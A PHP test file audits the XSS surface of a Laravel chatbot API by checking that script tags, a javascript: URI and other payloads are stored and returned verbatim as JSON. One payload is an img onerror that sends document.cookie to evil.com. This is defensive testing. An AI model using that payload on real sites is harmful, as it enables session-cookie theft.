<?php

// @requires PostgreSQL (CI/Docker only)

/**
 * XSS surface audit.
 *
 * The API is JSON-only; responses are never rendered as HTML by the server.
 * XSS risks exist only in the frontend (React dashboard + DOMPurify widget).
 *
 * These tests verify:
 * 1. XSS payloads stored in the API are returned verbatim as JSON strings
 *    (not executed — the risk is in the client renderer, which uses React's
 *    safe defaults + DOMPurify for markdown in the widget).
 * 2. Chatbot settings containing XSS payloads are accepted and stored
 *    safely (JSON transport, no server-side HTML rendering).
 * 3. Content-Type: application/json is always returned (not text/html).
 */

use App\Models\Chatbot;
use App\Models\Membership;
use App\Models\Organization;
use App\Models\User;
use App\Services\Public\WidgetSessionToken;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Queue;
use Illuminate\Support\Str;

uses(RefreshDatabase::class);

beforeEach(fn () => Queue::fake());

// ── Helpers ───────────────────────────────────────────────────────────────────

function xssChatbot(): array
{
    $org     = Organization::factory()->create();
    $user    = User::factory()->create();
    Membership::factory()->create(['organization_id' => $org->id, 'user_id' => $user->id, 'role' => 'owner']);
    $chatbot = Chatbot::factory()->for($org)->create(['status' => 'active']);
    $chatbot->load('settings');
    $token = $user->createToken('test')->plainTextToken;
    return compact('org', 'chatbot', 'user', 'token');
}

// ── Content-Type is always JSON ───────────────────────────────────────────────

it('all API responses have Content-Type: application/json', function () {
    ['token' => $token] = xssChatbot();

    $response = $this->withToken($token)->getJson('/api/v1/chatbots');

    expect($response->headers->get('Content-Type'))->toContain('application/json');
});

// ── User messages stored as plain text (not HTML-rendered by server) ──────────

it('XSS payload in a user message is stored and returned as a plain string', function () {
    ['chatbot' => $chatbot, 'token' => $token] = xssChatbot();

    $tokenSvc  = app(WidgetSessionToken::class);
    $visitorId = (string) Str::uuid();
    $conv      = $chatbot->conversations()->create([
        'organization_id' => $chatbot->organization_id,
        'visitor_id'      => $visitorId,
    ]);
    $jwt = $tokenSvc->issue($chatbot->public_id, (string) $conv->id, $visitorId);

    $xss = '<script>alert(1)</script>';

    $response = $this->withHeader('Authorization', "Bearer {$jwt}")
        ->postJson("/api/v1/public/conversations/{$conv->id}/messages", ['content' => $xss])
        ->assertStatus(202);

    // The payload must be in the JSON response as a string — not interpreted.
    $returned = $response->json('data.user_message.content');
    expect($returned)->toBe($xss);
});

it('img onerror payload in a message is stored verbatim', function () {
    ['chatbot' => $chatbot, 'token' => $token] = xssChatbot();

    $tokenSvc  = app(WidgetSessionToken::class);
    $visitorId = (string) Str::uuid();
    $conv      = $chatbot->conversations()->create([
        'organization_id' => $chatbot->organization_id,
        'visitor_id'      => $visitorId,
    ]);
    $jwt = $tokenSvc->issue($chatbot->public_id, (string) $conv->id, $visitorId);

    $xss = '<img src=x onerror="fetch(\'https://evil.com/\'+document.cookie)">';

    $response = $this->withHeader('Authorization', "Bearer {$jwt}")
        ->postJson("/api/v1/public/conversations/{$conv->id}/messages", ['content' => $xss])
        ->assertStatus(202);

    expect($response->json('data.user_message.content'))->toBe($xss);
});

// ── Chatbot settings (stored XSS check) ──────────────────────────────────────

it('XSS in welcome_message is stored as a string and returned in config', function () {
    ['chatbot' => $chatbot, 'token' => $token] = xssChatbot();

    $xss = '<script>alert("xss")</script>Hello!';

    $this->withToken($token)
        ->patchJson("/api/v1/chatbots/{$chatbot->id}/settings", ['welcome_message' => $xss])
        ->assertOk();

    // Config endpoint must return the exact string (client sanitises for display).
    $config = $this->getJson("/api/v1/public/chatbots/{$chatbot->public_id}/config")
        ->assertOk()
        ->json('data.welcome_message');

    expect($config)->toBe($xss);
});

it('javascript: URI in a settings field is stored verbatim (client sanitises)', function () {
    ['chatbot' => $chatbot, 'token' => $token] = xssChatbot();

    $payload = 'javascript:alert(1)';

    $this->withToken($token)
        ->patchJson("/api/v1/chatbots/{$chatbot->id}/settings", ['welcome_message' => $payload])
        ->assertOk();

    $returned = $this->getJson("/api/v1/public/chatbots/{$chatbot->public_id}/config")
        ->json('data.welcome_message');

    expect($returned)->toBe($payload); // stored as string; client (React/DOMPurify) sanitises
});
